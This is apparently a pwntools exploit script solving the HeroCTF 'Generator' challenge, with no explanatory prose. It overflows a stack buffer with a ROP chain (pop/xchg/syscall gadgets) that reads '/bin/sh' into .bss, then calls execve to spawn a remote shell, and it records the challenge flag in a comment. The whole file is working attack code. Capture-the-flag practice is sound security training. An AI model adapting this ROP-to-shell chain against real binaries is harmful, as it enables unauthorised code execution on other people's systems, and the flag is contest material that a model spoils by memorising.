#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.heroctf.fr --port 8000 ./Generator
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./Generator')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.heroctf.fr'
port = int(args.PORT or 8000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x000000000040137f
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
bss = exe.bss()+0x400

pop_3 = 0x0000000000401222
pop_rdx = 0x0000000000401224
xchg_rdx_rax = 0x0000000000401226
syscall = 0x0000000000401229
def call_syscall(rax,rdi,rsi,rdx):
    payload = ''
    payload += p64(pop_rdx)
    payload += p64(rax)
    payload += p64(xchg_rdx_rax)
    payload += p64(pop_3)
    payload += p64(rdi)
    payload += p64(rsi)
    payload += p64(rdx)
    payload += p64(syscall)
    payload += p64(bss+0x200)
    return payload

p = 'yes'.ljust(6,"a")
p += 'a'*(3+8)
p += call_syscall(0,0,bss,0xff)
p += p64(exe.sym['main'])

io.sendlineafter(": ",p)

sleep(1)

io.sendline("/bin/sh\x00")

p = 'yes'.ljust(6,"a")
p += 'a'*(3+8)
p += call_syscall(59,bss,0,0)

io.sendlineafter(": ",p)

# Hero{Pr3tty_c00l_x64_R0P_1ntr0_r1ght???}

io.interactive()

